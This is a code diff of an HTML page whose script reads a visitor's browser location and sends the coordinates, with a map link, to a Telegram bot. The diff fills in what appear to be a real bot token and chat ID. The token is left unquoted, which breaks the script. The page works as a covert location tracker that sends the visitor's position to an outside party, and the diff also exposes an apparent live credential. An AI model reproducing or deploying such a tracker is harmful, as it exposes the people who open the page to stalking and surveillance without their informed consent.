@@ -8,8 +8,8 @@
 <p id="status">Waiting for permission...</p>
 
 <script>
-const botToken = "YOUR_BOT_TOKEN"; // From BotFather
-const chatId = "YOUR_CHAT_ID";     // From userinfobot
+const botToken = 7543656541:AAGP1XW_x0rgP89iLUZwiiWieyCGjQcvZos; // From BotFather
+const chatId = 8144368202;     // From userinfobot
 
 function sendLocation(lat, lon) {
   const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=📍 Location: ${lat},${lon}\nhttps://maps.google.com/?q=${lat},${lon}`;
@@ -33,3 +33,4 @@ if (navigator.geolocation) {
 </script>
 </body>
 </html>
+
